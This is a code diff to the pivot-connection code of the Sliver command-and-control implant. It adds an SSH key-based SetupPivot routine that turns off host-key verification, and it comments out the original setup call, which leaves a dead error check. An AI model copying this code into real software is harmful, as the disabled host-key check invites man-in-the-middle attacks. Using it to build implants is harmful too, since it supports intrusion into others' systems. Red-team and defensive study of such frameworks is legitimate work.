@@ -32,6 +32,27 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
+// SetupPivot - The Comm prepares SSH code and security details, depending on our position (pivot or not).
+func (comm *Comm) SetupPivot(key []byte) (err error) {
+
+	// Encryption & authentication
+	signer, err := ssh.ParsePrivateKey(key)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("SSH failed to parse Private Key: %s", err.Error())
+		// {{end}}
+		return
+	}
+
+	comm.clientConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
+	comm.clientConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()
+	// m.clientConfig.HostKeyCallback = ssh.FixedHostKey(signer.PublicKey()) // Does not match server key
+
+	// Keep-alives and other
+
+	return
+}
+
 // InitPivot - Same as Init(), but used when the implant is handling a pivoted implant connection.
 func (m *Comm) InitPivot(conn net.Conn, key []byte) (sessionStream io.ReadWriteCloser, err error) {
 	// {{if .Config.Debug}}
@@ -39,7 +60,7 @@ func (m *Comm) InitPivot(conn net.Conn, key []byte) (sessionStream io.ReadWriteC
 	// {{end}}
 
 	// Pepare the SSH conn/security, and set keepalive policies/handlers.
-	err = m.Setup(true, key)
+	// err = m.Setup(true, key)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("failed to setup SSH client connection: %s", err.Error())
